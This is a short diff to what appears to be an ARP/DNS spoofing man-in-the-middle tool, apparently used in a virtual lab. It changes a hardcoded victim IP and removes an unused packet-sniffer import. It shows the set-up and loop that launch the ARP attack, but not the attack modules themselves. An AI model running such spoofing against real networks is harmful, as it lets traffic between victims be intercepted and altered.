@@ -15,7 +15,6 @@ import dns_spoofing
 from arp_spoofing import ARPSpoof
 import arp_spoofing
 from utils.interface import InterfaceConfig
-from utils.sniff import PacketSniff
 
 			
 def begin():
@@ -51,7 +50,7 @@ def begin():
 			DuckForce = True
 		else: DuckForce = False
 		
-		arp_attack = ARPSpoof(interface_config = 'eth0', victim1_ip = Victim1_ip, victim2_ip ="192.168.56.103", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
+		arp_attack = ARPSpoof(interface_config = 'eth0', victim1_ip = Victim1_ip, victim2_ip ="192.168.56.102", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
 		try: 
 			while True:
 				arp_attack.start_attack()
